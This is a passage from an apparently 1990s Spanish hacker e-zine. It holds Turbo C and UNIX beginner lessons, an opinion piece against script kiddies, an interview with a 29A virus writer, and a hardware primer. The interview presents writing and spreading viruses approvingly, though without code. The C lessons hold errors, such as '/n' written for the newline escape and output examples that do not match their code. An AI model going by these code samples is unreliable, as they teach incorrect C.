Pero bueno, pa la gente que necesita algo mas de ayuda, aqui os pongo lo que
nos indica la linea de estado:

    -Line n§: el numero de linea

    -Col n§: el numero de columna

    -Insert: Modo insercion activado

    -Indent: Autoindentado activado (pa que cuando le demos a enter no vaya a
             la columna uno)

    -Tab: para enchufar tabuladores

    -unidad/nombrefichero: pues eso, la unidad y el nombre del fichero con el
                           que trabajamos.



        1.5 Indicar subdirectorios


Bien, vamos a ver si me explico y queda esto clarito, las ordenes en turbo C
ya estan definidas en ficheros, y turbo c debe saber donde estan esos
ficheros para poder compilar y ejecutar un programa, porque digo esto, bien
porque a turboc hay que indicarle por onde andan esos susodichos ficheros.

Para indicarselo a turboC nos vamos a la opcion OPTIONS (en menu principal),
ahora escoge la opcion DIRECTORIOS ahora nos encontramos con un submenu con
dos opciones:

    -ficheros Include, bueno pues eso , le indicas donde tienes los ficheros
     de extension *.h,si lo hiciste como yo te he dicho al principio estaran
     en a:\include

    -Library directories, aqui es donde le teneis que decir donde estan los
     ficheros que yo os dije que pusierais en c:\lib, si los pusiste en otra
     parte pues se lo indicas a turboc.

NOTA: (Para los mas torper) Si has puesto todos los archivos en tu disco duro
      en un subdirectorio llamado turboC (o cualquier otra cosa) pues en
      ambos casos pondras  C:\TURBOC.

Cuando ya hayais echo esto os vais a OPTIONS - STORE OPTIONS para que se
guarden las rutas que habeis dado porque si no cada vez que inicies turboc
tendras que indicarle las rutas.



        1.6 Pa indicarle a turboc onde guardamos nuestros ficheros


Bien, aqui lo unico que digo es que os vayais a File-CHANGE DIR para indicar
la unidad donde guardareis los archivos ( c:\, a:\..), asi os ahorrais
enchufar la unidad cada vez que guardais algo ;o)



        1.7 Ponerle el nombre a un fichero


Os vais a FILE-WRITE TO y escribis el nombre del fichero (turboc le a¤adira
la extension *.c)



        1.8 Grabamos el fichero


Os vais a FILE-SAVE, si ya habeis indicado el nombre del fichero y la unidad
anteriormente como os he dicho al salvarlo lo hara automaticamente.



        1.9 Cargar ficheros


FILE-LOAD indicamos ruta del fichero y a trabajar.



        1.10 Salir del puto turboc


FILE-QUIT (sin comentarios)


                      <Ripe: Sin come que?.... xD>


Terminado ya el capitulo numero uno... vayamos directamente al capitulo
numero dos, jeje.





                     CAPITULO 2 -  FUNCIONES DE SALIDA



        2.1 Estrucutura del programa


Bien, lo primero que diremos es que un programa en C es una secuencia de
caracteres que posteriormente sera compilado para que el ordenador entienda
el lenguaje.

En cuanto a la estructura de los programas: primero colocaremos las
especificaciones de objetos externos, despues las diferentes funciones que se
describan y se utilizen (aunque tambien pueden ir despues del cuerpo
principal) y el cuerpo principal del programa.

Bien, el cuerpo principal esta formado por la funcion MAIN(), sera detras de
esta donde pondremos las instrucciones que forman el programa principal
encerradas entre llaves.

Asi pues una posible estructura seria

        Objetos Externos

        Funcion()

        Funcion()
        
        main()

        {
                
                Instruccion
                Instruccion
        }



        2.2 Elementos basicos


En Turbo C estos son:

    -Entrada: Escribir informacion en un periferico de salida.

    -Tipos de datos: Constantes, variables y estructuras (pueden contener
                     numeros, texto o direcciones de variables).

    -Operaciones: Asignar un valor a una variable, operar y comparar.

    -Entrada: Leer valores de perifericos de entrada.

    -Ejecucion  condicional: Ejecutar instrucciones solo cuando una condicion
                             sea cierta.

    -Bucles: Ejecutar condicciones mientras se cumpla una condicion.

    -Subrutinas: Conjunto de instrucciones independientes del programa
                 principal, que puede ejecutarse desde cualquier punto del
                 programa.
        


        2.3 Comentarios


Los comentarios se usan para dar claridad al programa de manera que faciliten
su entendimiento a otras personas al leerlo.

En TurboC los comentarios van encerrados entre /* y */

Ej:

/*Un comentario*/

/*Comentario
con varias
lineas*/

/********************
*Para enmarcarlo*
*;o);o);o);o)*
*********************/



        2.4 Printf


La veremos un poco mejor de aqui a un par de parrafos ;o), por ahora dire que
es una de las funciones de salida mas utilizadas y que nos permite escribir
en pantalla unalista de datos( que pueden ser caracteres, conjunto de
caracteres numeros reales o enteros).

Su sintaxis es:

             printf("formato",arg1,arg2,...argn);

donde FORMATO es una serie de caracteres entre comillas en la que se pueden
encontrar dos tipos de datos:

    -mensajes o textos a representar literalmente

     ej:     printf("buenos dias");

     que si lo compilasemos tendriamos un programa que al ejecutarlo diria
     "buenos dias"

               <Ripe: Pero yo quiero que diga "malos dias" :P>

   -simbolos especificadores de formato para representar los argumentos
    (arg1,arg2 y argn  serian los argumentos que queremos representar). Este
    tipo lo veremos de aqui a un par de puntos.



        2.5 Compilar y ejecutar


Para compilar un fichero se utiliza la opcion COMPILE; COMPILE to OBJ, esta
opcion creara un nuevo fichero objeto de extension .obj

Para ejecutar el programa desde el sistema operativo ademas de compilar
debemos crear un .exe, esto seria haciendo COMPILE ; Make EXE file  y turboc
creara el fichero .exe

Para hacerlo todo de golpe (compilar y crear el fichero .exe) haremos COMPILE
; BUILD ALL.



        2.6 Solucionar errores


Es muy probable (y mas en turbo c) que cuando compiles algun programa hayas
cometido algun peque¤o error, aveces simplemente al equivocarte de tecla, en
ese caso cuando intentes compilar turboc te pondra en la ventana de mensajes
los errores que ha encontrado y la linea donde se encuentran con el fin de
que puedas corregirlos.



        2.7 Otra vez Printf


Recordemos la sintaxis printf("formato",arg1,arg2,...argn);

Arg1, arg2... son los diferentes argujmentos que se desean presentar.

Dentro de la cadena "formato", se indican los especificadores de formato de
los argumentos.

Un especificador de formato empieza por % seguido de una letra dependiendo
del dato a representar, asi:

    -%d numeros enteros

    -%f numeros reales

    -%e numeros reales en coma flotante

    -%c caracteres

    -%s palabras

Tambien decir que en los argumentos los numeros deben ir sin comillas, las
palabras dobles comillas y los caracteres comillas simples.

Veamos un ejemplo que es como mejor se entienden las cosas:

           printf("%d, %f, %e, %c, %s",5,3.12,3.25,'u',"buenas");

Si creesemos el .exe, el programa al iniciarlo lo que haria seria representar
en pantalla la siguiente linea:

           5, 3.12, 0.3250000e+001, u, buenas

Diremos tambien que entre el % y el tipo de dato se puede a¤adir un numero
que indique la longitud minima del campo en el que se representara el dato y
si a¤adimos el signo - el dato se justificara a la izquierda. Tambien podemos
especificar el numero de decimales de un numero precediendo al numero de un
punto.

Un ejemplo mas:

           printf("%-9s,%5d, %.3e","casa",23,6.40);

esto representaria en pantalla

                casa    ,       23, 0.640e+001

Tambien podemos a¤adir caracteres que indican salto de linea y tabulacion. Si
a¤adimos /n hay un salto de linea y si a¤adimos /t hay un salto al siguiente
tabulador.

ejemplo:

        printf("tu aficion: %s \n","nadar");
        printf("\ntu edad: \t %d", 55);

Esto quedaria en pantalla:

        tu aficion: nadar
        tu edad:        55



        2.8 Puts


Puts es una orden de salida muy similar a printf, que tiene la caracteristica
que para hacer un salto de linea no es encesario a¤adir /n. Veamos un
ejemplo:

        puts("Comprate");
        puts("una moto");

esto represantaria en pantalla:

        Comprate
        una moto

Para hacer esto con la orden printf hariamos:

        pritnf("Comprate\n");
        printf("una moto");




    **SE ACABO, AHORA VAYAMOS A LA PRACTICA QUE ES LO QUE MOLA MAS**


Buenos, pues ya hemos acabado por hoy, ahora ya estais preparados para
escribir vuestro primer programa, os hago un ejemplo y luego vosotros dentro
de lo visto practicais, un posible programa con lo visto seria:

1.-Entramos al turboc

2.-En la ventana de edicion escribiremos nuestro primer programa, este solo
   tendra funcion, main(), que es ademas el cuerpo principal, asi pues
   escribimos por ejemplo:

       main()
      {
        printf("Por fin he escrito/n");
        printf("alguna cosa en C");
      }

3.-Guardamos el programa, (ej:primero) y copilamos y creamos el .exe.

4.-Salimos de TurboC y desde msdos te vas al directorio donde hayas guardado
   el programa (ej:mis programas) y escribes:

c:\mis programas\primero.exe

        Por fin he escrito
        alguna cosa en C

c:\mis programas\

Bueno, pues nada, nos vemos en el proximo numero ;o)


          <Ripe: Esperamos que este curso de C os haya llamdo
                 la atencion y que lo sigais numero a numero...
                 Sin faltar a ningun nuemero ;) >





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º5.- Curso de UNIX III         º      Hacking       º         Bajo          º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                     [ Ripe ]

Bueno, y ya van 3. En el numero anterior vimos algunas ordenes basicas que
se pueden utilizar para mostrar alguna informacion sobre el sistema, y
ordenes para pedir ayuda. Antes de seguir explicando mas ordenes de UNIX,
sera conveniente conocer bien el sistema de archivos de este sistema
operativo. Asi que....

Toda la informacion que almacena un computador de guarda mediante archivos, y
a cada archivo se le prporciona un nombre (esto no es bien bien asi,
pero...), por lo que facilita al usuario la busqueda de la informacion. En
UNIX existen tres tipos basicos de archivos, algunos de ellos tiene variantes,
pero no vamos a entrar en detalles:

1.-ARCHIVOS ORDINARIOS: Estos archivos estan formados por series de bytes, en
                        estos archivos se acostumbra a almacenar textos,
                        programas, datos, etc. (Normalmente contienen la
                        informacion en formato ASCII).

2.-ARCHIVOS DIRECTORIO: UNIX, a diferencia que otros sistemas operativos
                        interpreta los directorios como archivos, aun que
                        estos no son archivos de texto ASCII. Un archivo
                        directorio, contiene en su interior informacion sobre
                        otros archivos.

3.-ARCHIVOS ESPECIALES: Este sistema operativo se empe¤a en que todo sean
                        archivos, y interpreta todos los dispositivos de
                        entrada y salida como archivos especiales.

Los archivos en UNIX se clasifican mediante un sistema definido, que supongo,
vostros ya conocereis. Se almacenan de la siguiente manera:

       ÚÄÄ usr
       ³
       ³
root ÄÄÅÄÄ etc
       ³
       ³
       ÀÄÄ bin

De manera que cada usuario del sistema tendra su propio directorio,
normalmente dentro del directorio usr (no voy a contar el concepto de
subdirectorio, pues creo que el 99'9999% de las personas que estan lellendo
esto ya lo saben). El usuario puede introducir en el interior de su
directorio otros directorios, o archivos ordinarios, pero nunca archivos
especiales (a no ser que haga un lincaje, esto se explicara mas adelante).
Asi pues la cosa queda de la siguiente manera.

                 ÚÄÄ Amparo
                 ³
                 ³
       ÚÄÄ usr ÄÄÅÄÄ Tomy
       ³         ³          ÚÄÄ Textos 
       ³         ³          ³
root ÄÄÅÄÄ etc   ÀÄÄ Ripe ÄÄ´
       ³                    ³
       ³                    ÀÄÄ Xploits
       ÀÄÄ bin

Siguiendo con lor archivos de UNIX, dire que para hacer qeu un fichero este
oculto, basta con incluir un punto (.) delante el nombre del archivo. Aqui
muestro una lista de ejemplos de archivos ocultos:

                .documentos                     .programa             
                .guia.telefonos                 .trabajo

Como se puede observar en el archivo .guia.telefonos, tambien es posible
incluir un punto (.) en el interior del archivo, pero este no lo ocultara.
Debido a que UNIX no permite espacios en los nombre de archivo, se deben
utilizar alternativas, y una de ellas es el punto, aun que tambien se
pueden utilizar otras como la barra (-), la subbarra (_), etc.  ;)

Ahora ya hemos visto de forma superficial la estructura logica del sistema de
archivos en UNIX, pero ¨Como sabe el sistema donde localizar los archivos en
el disco? Eso es lo que voy a tratar de explicar a cntinuacion.

Cada disco duro se divide en 4 bloques basicos, de los cuales solo voy a
explicar 3:

1.-BLOQUE DE ARRANQUE: Como supongo que ya habreis deducido, es donde se
                       encuentran los programas encargados de mantener el
                       arranque del sistema.

2.-BLOQUE SUPERIOR: En este bloque se almazena informacion sobre el propio
                    disco (memoria utilizada, memoria libre, etc).

3.-BLOQUE DE I-NODOS: (Como veremos a continuacion este bloque es muy
                      importante para el sistema de archivos) El usuario de
                      un UNIX conoce a cada a cada archivo por un nombre,
                      pero el UNIX necesita asignarle un numero para
                      identificarlo, en este bloque se encuentra una relacion
                      entre nombre de archivos e i-nodos. Ademas tambien se
                      almacena informacion sobre los archivos, localizacion
                      de sus bloques en el disco (Pregunta anterio respuesta
                      :P), identificador de propietario y grupo, permisos de
                      acceso, fechas y horas de el ultimo acceso y
                      modificacion, etc.

                      Un apunte para terminar ha hablar de este bloque; Los
                      i-nodos de archivos especiales no muestran la
                      localizacion de sus bloques en el disco, pues no los
                      tienen :)


Ahora ya estamos capacitados para entender mejor que es exactamente un
directorio. Un directorio es, como ya dijimos, un archivo, y este lo que
constiene en su interior no es mas que los i-nodos de losa archivos que
contiene.

Bueno fieles seguidores de este curso de UNIX, ha  llegado la hora de dejarlo
por hoy..... seguriremos informando.





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º6.- Ni¤os malos               º      Opinion       º                       º     
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                  [ Anonimo ]

NOTA: Entre el correo que he recibido para este numero, he encontrado un
      intresante articulo de opinion, en el que el autor no quiere desvelar
      su identidad, pues nosotros respetamos su anonimato.

El futuro de la humanidad es muy importante, y este pasa sin lugar a duda por
la informatica, y en consecuencia por internet, pero por lo visto el hombre
tiende a la autodestruccion, cosa que ya se ha visto a lo largo de la
historia, y no podia ser menos en internet. Internet es el metodo de
comunicacion mas avanzado inventado hasta la fecha, una necesidad para unos
pocos, diversion para otros. Pero si internet es ta importante para el
hombre ¨por que co¤o lo estamos convirtiendo en un campo de batalla? Si,
habeis leido bien, he dicho CAMPO DE BATALLA; basta con pasar un tiempo
enchufado al IRC para observar la cantidad de ni¤os malos que se dedican a
nukear (con "programillas" que otros dise¤an y dibulgan y que no tienen ni
puta idea de como funcionan), pingear desde el ordenador de una inocente
universidad, floodear.... en definitiva ­Joder!

Pero eso no es todo, no solo se encuentran ni¤os malos en IRC, tambien se
encuentran en el servicio mas usado de la red, la World Wile Web. Es muy
habitual ir a parar a una pagina de fondo negro en la que pone con letras de
color claro "hacked by...." ¨es que tanto divierte joder a los webmasters que
tanto se curran una web y que confian en un administrador que solo piensa en
terminar su jornada laboral (soy administrador y se de lo que hablo)? Triste
pero cierto, y lo peor es que la cosa no termina ahi ¨con que objetivo un
individuo crea un virus y lo dibulga? ¨quiza para enriquezerse a costa de los
pobres usuarios que se dedican a la compra de antivirus? Quien sabe, hay de
todo en este mundo, aun que quiza no tarde en haber nada, pues, como ya dije,
el hombre tiende a la autodestruccion, y no hay nada que hacer si gente como
vosotros se dedica a divulgar informacion comprometida....

              <Ripe: ¨Informacion comprometida? ¨divulgar?
                     mmm... este es un pais libre ¨no?> 

              <Ripe: Aun que he de decir que compato parte
                     de esta opinion>





ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º7.- Charlando con GriYo       º     Entrevista     º                       º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                     [ Ripe ]

Si leisteis el numero anterior de {7A69} ya sabreis que en este numero
iniciamos una seccion dedicada a entrevistar a personages conocidos del
mundo del Undergr0und. Es una seccion que personalmente me gusta mucho (y mas
si soy yo el que hace las preguntas :P), y espero que a los lectores tambien.

¨Y a quien le ha tocado ser el primero? Pues a uno de los mejores creadores
de virus de el mundo mundial, jeje.

                    _____
                   / ____|             __      __
                  | /         ____     \ \    / /  __
                  | |   ___  /  __|     \ \  / /  /  \
                  | |  |  _| | |    |^|  \ \/ /  | /\ |
                  | \__| /   | |    | |   \  /   | \/ | 
                   \_____|   |_|    |_|   / /     \__/
                                         / /
                                        / /
                                       /_/


Este joven personage de 27 a¤os, residente en Madrid, forma parte de unos de
los grupos de investigacion virica mas importantes del mundo, el 29A (numero
de la bestia pasado a hexadecima). GriYo se metio en el mundo de los virus
tras observar anomalias en su PC (je je), y como el dice "si veo algo y me
gusta intento hacerlo yo tambien"....

Pues ya sabemos un poco de este personage, ahora veamos que responede a
nuestras preguntas:




1.-Me imagino quete habran echo estas preguntas muchas veces, pero es
   pregunta obligada. ¨Porque ese apodo de GriYo?

     Me han hecho esta pregunta muchas veces, la respuesta no tiene
     misterio alguno: Me empezo a llamar asi un amigo que decia que me
     parecia a "Pepito Grillo"... Heheh, que simpatico el, la cuestion
     es que me quede con el apodo.

                  

2.-Que te impulso a crear tu primer virus? cual fue su nombre, y porque?

     Cada vez que veo algo que me gusta o que me impresiona, tengo que
     intentar hacerlo yo mismo, no me puedo estar quieto. Empece a
     estar cada vez mas interesado por el tema de los virus. Para mi
     es algo parecido a una sofisticada partida de ajedrez. Un juego
     al que finalmente me decidi a jugar.

     Entonces escribi mi primer virus, Cricri, que tubo buena acogida
     en la scene, y me sirvio para conocer gente muy interesante, de
     la que he ido aprendiendo mucho (como personas y como
     programadores).

     El motivo de llamar al virus Cricri es simple, siendo GriYo,
     Cricri me parecia bastante oportuno.



3.-Cual de tus creaciones te ha sorprendido mas?

     La parte que no puedes predecir de un virus es la que te
     sorprende. Pasarte una semana infectado por mi propio virus sin
     percatarme me sorprendio bastante. Esto fue con mi virus Implant,
     claro, siendo un virus full-stealth no habia forma de verlo.

     Gollum me sorprendio por su capacidad para reproducirse.
     Tratandose de un ejemplar con dise¤o orientado unicamente a la
     experimentacion me dejo perplejo cuando le vi en las listas de
     virus mas difundidos en ciertos paises.



4.-Hay alguna "relaciones economicas" entre algunos creadores de virus y
   algunas casas antivirus?

     Desde luego. Pero no es mi caso. No quiero saber nada de esa
     gente, la mayoria son unos ignorantes.



5.-Cuentanos un poco como nacio 29A y con que proposito.

     29A nacio a partir de una BBS Underground llamada DARKNODE, en
     la que muchos autores y coleccionistas de virus se daban cita.
     El proposito de 29A era y sigue siendo el mismo: Investigar en
     este campo, publicar nuestros descubrimientos y, personalmente,
     formar parte de un grupo de amigos... De fantasticas personas.



6.-Como ves el futuro del Under hispano (en especial el tema virus)?

     La scene española esta plagada de figuras, especialmente en el
     area de los virus. Personalmente no es algo que me preocupe
     mucho, para mi las nacionalidades no tiene nigun significado.



7.-Que conocimientos crees que tiene la "gente normal" sobre los virus
   informaticos?

     Lo normal es una total ignorancia... Prueba de ello son los
     mensajes de correo del tipo "GOOD TIMES". Si la gente cuela con
     esas cosas, es por ignorancia.

     Por norma nadie se preocupa por la seguridad informatica hasta
     que no ocurre algun incidente.



8.-Crees que se ha perdido un poco el encanto de crear virus, con la
   aparicion de virus macro?

     No me parece que sea asi. Peronalmente nunca he escrito ningun
     virus de Macro. Infectar el sistema operativo me parece algo
     mucho mas interesante y serio que residir en un sistema a costa
     del Office.



9.-A que se dedica GriYo? En que se gana la vida?

     Programador, administrador, temas de seguridad, incluso
     programacion de videojuegos... Un poco de todo.



10.-Estas trbajando en algun proyecto en estos momentos?

     Si, me encuentro en la fase final del desarrollo de un nuevo
     virus para el proyecto Simbiosis. Y dando los ultimos toques al
     numero 4 de 29A que saldra proximamente.



11.-Que pregunta no te han hecho nunca y te gustaria que te hiziesen?

     Me gustaria que alguien me preguntase que pregunta me gustaria
     que me hiciesen y que nunca me hayan hecho. heh.

           <Ripe: Pues, nada... Ya te hemos dado el gustazo>



12.-Cual es tu comida favorita? ;)

     Borsh, una movida rusa que sabe preparar mi novia y que esta
     muy buena.

           <Ripe: ¥am ¥am... Dile a tu novia que me prepare
                  un dia de estos un plato de Brosh a mi :P>




Bueno. aqui terminamos nuestra primera entrevista... antes de terminar he de
agradecer a GriYo que se dejo entrevistar y nos conto cosas muy intimas (uy
que se me va la pelota). De todos modos ­­GRACIAS!!

NOTA: Para el proximo numero trataremos de entrevistar al conocido grupo de
      "hacking blanco" JJF / Hackers Team, es vuestra oportinidad para
      hacerles alguna pregunta... Si teneis alguna pregunta intresante que
      hacerles:

                             7a69ezine@mixmail.com

Namas por hoy :)



ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º8.- Entra¤as del computador   º      Hacking       º      Medio-Bajo       º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                     [ Ripe ]

Antes de empezar a hablar sobre la estructura de un sistema operativo
comentaremos las entra¤as y el funcionamiento de un computador (ya que
alludaran un poco a entender el tema de este texto).

Todo computador consta de dos partes basicas, el hardware y elsoftware se
complementan para realizar las funciones basicas de la maquina; entrada
salida, proceso y almacenamiento.

Dentro del hardware podemos encontrar cuatro tipos y dada uno de ellos
realiza una funcion difrente:

         -Dispositivos de entrada

         -Dispositivos de salida

         -Unidades de almacenamiento

         -Procesador


*****************ESTRUCTURA DEL FUNCIONAMIENTO DEL HARDWARE******************

                  ÚÄÄÄÄÄÄÄÄÄ¿   ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄÄÄÄÄÄÄÄÄ¿
       USUARIO ÄÄ>³ Entrada ³ÄÄ>³ Procesador ³ÄÄ>³  Salida ³ÄÄ> USUARIO
                  ÀÄÄÄÄÄÄÄÄÄÙ   ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÀÄÄÄÄÄÄÄÄÄÙ
                                   ³     
                                        ³
                              ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                              ³ Almacenamiento ³
                              ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

*****************************************************************************

DISPOSITIVOS DE ENTRADA: Los dispositivos de entrada se usan para introducir
                         datos en un computador, en la actualidad hay una
                         gran cantidad de dispositivos de este tipo.

DISPOSITIVOS DE SALIDA: Los dispositivos de salida son aquellos que musrtran
                        el resultado de algun proceso.
                        Algunos dispositivos pueden realizar la funion de
                        dispositivos de entrada y de dispositivos de salida.

UNDS. DE ALMAZENAMIENTO: Las unidades de almacenamiento son capaces de
                         guardar informacion a base de bits. Hay dos tipos de
                         almacenamiento, el almacenamiento en memoria
                         primario y el almacenamiento en memoria secundaria.

                         El almacenamiento en memoria primaria (RAM) es un
                         almacenamiento temporal (cuando se apaga el
                         ordenador se pierden todos los datos) de acceso muy
                         rapido, y contiene todo o parte de los programas en
                         ejecucion y datos asociados.

                         El almacenamiento en memoria secundaria se utiliza
                         para guardar programas que no esten en ejecucion y
                         una gran cantidad de datos. Es de acceso mas lento
                         que el de la memoria primaria.

PROCESADOR: Despues de hablar de los dispositivos de entrada y de salida y de
            las unidades de alamcenamiento vamos a hablar de la cosa mas
            importante de toda computadora, el procesador. Este consta de
            tres partes basicas, la unidad aritmetico-logica (ALU) que se
            encarga de realizar todad las operaciones aritmeticas y logicas
            del procesador (tambien pueden realizar funciones mas complejas)
            ,los registros, que podrian considerarse tambien como una unidad
            de almacenamiento (bastante parecedi al almacenamiento en momoria
            primaria), ya que se encargan de almacenar instrucciones y datos
            de acceso immediato. Y la unidad de control que es la parte mas
            importante del procesador, ya que se encarga de coordinar y
            dirigir los componentes del sistema asi como los registros y la
            ALU.

Vistos ya los componentes (hardaware) de un computador vamos explicar como se
ejecuta una instruccion en el procesador. podemos considerar que hay dos
ciclos en la ejecucion de una instruccion. En el primer ciclo (llamado ciclo
de instruccion) la Unidad de control lee una instruccion de la memoria
principal y la almacena en un registro (llamado registro de instruccion),
seguidamente incrementa el contador del registro de instruccion (que se
encarga de hacer referencia a la siguiente instruccio a ejecutar), acto
seguido la unidad de control envia un impulso electrico a la ALU para que
ejecute la instruccion. ya en el segudo ciclo (llamado ciclo de ejecucion),
la ALU lee el registro de instruccion y los datos asociado para seguidamente
ejecutar la instruccion. Terminada ya la ejecucion de la instruccion se
almacenan los resultados obtenidos en registros y la ALU envia una se¤al a
la unidad de control para que que lea la siguiente orden. Como podeis veer
el ciclo de instruccion se produce an la unidad de control mientras que el
ciclo de ejecucion se realiza en la ALU. En el siguiente esquema se resume el
proceso de ejecucion de una instruccion.

********************PROCESO DE EJECUCION DE UNA INSTRUCCION******************

                 
                     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                     ³                                  ³
                                                       ³
            ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»                    ÉÍÍÍÍÍ»
            º Unidad de control º                    º ALU º
      ÉÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍ»  ÉÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍ»
      º      ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿      º  º      ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿      º
      º      ³ Lee intruccion ³      º  º      ³ Se¤al a la U.C ³      º
      º      ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ      º  º      ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ      º
      º              ³               º  º                             º
      º                             º  º               ³              º
      º    ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿    º  º  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿  º
      º    ³ Incrementa puntero ³    º  º  ³ Resultados a registros ³  º
      º    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ    º  º  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ  º
      º              ³               º  º                             º
      º                             º  º               ³              º
      º      ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿      º  º    ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   º
      º      ³ Se¤al a la ALU ³      º  º    ³ Ejecuta instruccion ³   º
      º      ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ      º  º    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   º
      ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼  º                             º
                     ³                  º               ³              º
                     ³                  º     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿    º
                     ³                  º     ³ Lee orden y datos ³    º
                     ³                  º     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ    º
                     ³                  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                     ³                                  
                     ³                                  ³
                     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

*****************************************************************************

Hemos visto una informacion algo detallada (no demasiado) sobre el
funcionamiento del harware de una computadora, por lo que ahora pasaremos a
hablar de la ortra parte indispensable, el software.

Antes que nada decir que todo softeare es un programa (conjunto de
instrucciones aritmeticas o logicas que el procesador es capaz de interpretar
y ejecutar) y que hay dos tipos basicos de software:

         -Software de sistema

         -Software de aplicacion


SOFTWARE DE SISTEMA: El software de sistema esta formado por una serie de
                     programas que se encargan de gestionar y controlar los
